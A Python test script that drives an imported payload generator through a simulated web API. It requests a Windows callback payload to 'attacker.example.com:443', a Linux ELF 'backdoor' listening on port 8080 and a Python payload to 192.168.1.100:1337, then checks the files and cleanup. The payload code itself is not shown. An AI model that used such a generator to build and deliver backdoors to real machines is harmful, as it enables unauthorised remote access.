#!/usr/bin/env python3
"""
Test web integration - simulates how the web server would use our code
"""

import os
import sys
import json
from pathlib import Path

# Setup environment
sys.path.insert(0, '/workspace')
os.environ['PATH'] = os.environ.get('PATH', '') + ':/home/ubuntu/.local/bin'

def test_web_api_simulation():
    """Simulate the web API endpoint behavior"""
    
    print("="*70)
    print("WEB API INTEGRATION TEST")
    print("="*70)
    
    # Simulate Flask session storage
    session = {}
    
    # Import the enhanced generator
    from web_payload_generator import web_payload_gen
    
    # Test Case 1: Windows payload request (will fallback to Python without Wine)
    print("\n[TEST 1] Windows Payload Request")
    print("-"*50)
    
    request_data = {
        'bind_host': '0.0.0.0',
        'bind_port': '4433',
        'listen_host': 'attacker.example.com',
        'listen_port': '443',
        'enable_bind': False,
        'enable_listen': True,
        'platform': 'windows',
        'payload_name': 'windows_payload'
    }
    
    print(f"Request: {json.dumps(request_data, indent=2)}")
    
    result = web_payload_gen.generate_payload(request_data)
    
    if result['success']:
        # Store in session as the web app would
        session['payload_path'] = result['payload_path']
        session['payload_filename'] = result['filename']
        session['payload_type'] = result['payload_type']
        session['payload_platform'] = result['platform']
        
        print(f"\n✓ Payload Generated Successfully!")
        print(f"  File: {result['filename']}")
        print(f"  Type: {result['payload_type']}")
        print(f"  Platform: {result['platform']}")
        print(f"  Size: {result['size']:,} bytes")
        print(f"  Path: {result['payload_path']}")
        
        if 'warning' in result:
            print(f"  ⚠ Warning: {result['warning']}")
    else:
        print(f"\n✗ Generation Failed: {result['message']}")
        return False
    
    # Test Case 2: Linux binary request
    print("\n[TEST 2] Linux Binary Request")
    print("-"*50)
    
    request_data = {
        'bind_host': '0.0.0.0',
        'bind_port': '8080',
        'listen_host': '',
        'listen_port': '',
        'enable_bind': True,
        'enable_listen': False,
        'platform': 'linux',
        'payload_name': 'linux_backdoor'
    }
    
    print(f"Request: {json.dumps(request_data, indent=2)}")
    
    result = web_payload_gen.generate_payload(request_data)
    
    if result['success']:
        session['payload_path'] = result['payload_path']
        session['payload_filename'] = result['filename']
        session['payload_type'] = result['payload_type']
        session['payload_platform'] = result['platform']
        
        print(f"\n✓ Payload Generated Successfully!")
        print(f"  File: {result['filename']}")
        print(f"  Type: {result['payload_type']}")
        print(f"  Platform: {result['platform']}")
        print(f"  Size: {result['size']:,} bytes")
        print(f"  Path: {result['payload_path']}")
        
        # Verify it's actually an executable
        if result['payload_type'] == 'executable':
            # Check ELF header
            with open(result['payload_path'], 'rb') as f:
                header = f.read(4)
                if header == b'\x7fELF':
                    print(f"  ✓ Verified: Linux ELF executable")
                else:
                    print(f"  ✗ Not an ELF executable!")
    else:
        print(f"\n✗ Generation Failed: {result['message']}")
        return False
    
    # Test Case 3: Python script request (explicit)
    print("\n[TEST 3] Python Script Request")
    print("-"*50)
    
    request_data = {
        'bind_host': '',
        'bind_port': '',
        'listen_host': '192.168.1.100',
        'listen_port': '1337',
        'enable_bind': False,
        'enable_listen': True,
        'platform': 'python',
        'payload_name': 'portable_payload'
    }
    
    print(f"Request: {json.dumps(request_data, indent=2)}")
    
    result = web_payload_gen.generate_payload(request_data)
    
    if result['success']:
        print(f"\n✓ Payload Generated Successfully!")
        print(f"  File: {result['filename']}")
        print(f"  Type: {result['payload_type']}")
        print(f"  Platform: {result['platform']}")
        print(f"  Size: {result['size']:,} bytes")
        
        # Verify it's Python
        if result['filename'].endswith('.py'):
            print(f"  ✓ Verified: Python script file")
    else:
        print(f"\n✗ Generation Failed: {result['message']}")
        return False
    
    # Simulate download endpoint behavior
    print("\n[TEST 4] Download Simulation")
    print("-"*50)
    
    # Get last payload from session
    payload_path = session.get('payload_path')
    payload_filename = session.get('payload_filename')
    payload_type = session.get('payload_type')
    
    if payload_path and os.path.exists(payload_path):
        print(f"✓ Ready for download:")
        print(f"  Filename: {payload_filename}")
        print(f"  Type: {payload_type}")
        print(f"  Exists: Yes")
        
        # Determine MIME type as the web app would
        if payload_filename.endswith('.exe'):
            mimetype = 'application/x-msdownload'
        elif payload_filename.endswith('.py'):
            mimetype = 'text/x-python'
        else:
            mimetype = 'application/octet-stream'
        
        print(f"  MIME Type: {mimetype}")
    else:
        print("✗ Payload not available for download")
        return False
    
    return True

def test_cleanup():
    """Test the cleanup functionality"""
    print("\n[TEST 5] Cleanup Old Payloads")
    print("-"*50)
    
    from web_payload_generator import web_payload_gen
    
    # Check how many config directories exist
    payloads_dir = Path('/workspace/Payloads')
    if payloads_dir.exists():
        config_dirs = [d for d in payloads_dir.iterdir() if d.is_dir() and d.name.startswith('config')]
        print(f"Found {len(config_dirs)} payload directories before cleanup")
        
        # Clean up, keeping only last 3
        web_payload_gen.cleanup_old_payloads(keep_last=3)
        
        config_dirs_after = [d for d in payloads_dir.iterdir() if d.is_dir() and d.name.startswith('config')]
        print(f"Found {len(config_dirs_after)} payload directories after cleanup")
        
        if len(config_dirs_after) <= 3:
            print("✓ Cleanup successful")
        else:
            print("✗ Cleanup didn't work as expected")

if __name__ == "__main__":
    print("\nStarting Web Integration Tests...\n")
    
    # Run main tests
    success = test_web_api_simulation()
    
    # Run cleanup test
    test_cleanup()
    
    print("\n" + "="*70)
    if success:
        print("✓ ALL WEB INTEGRATION TESTS PASSED")
        print("\nThe web payload generation system is working correctly!")
        print("It generates:")
        print("  • Linux executables (13MB ELF binaries via PyInstaller)")
        print("  • Python scripts (as fallback or when requested)")
        print("  • Would generate Windows .exe with Wine installed")
    else:
        print("✗ SOME TESTS FAILED")
    print("="*70)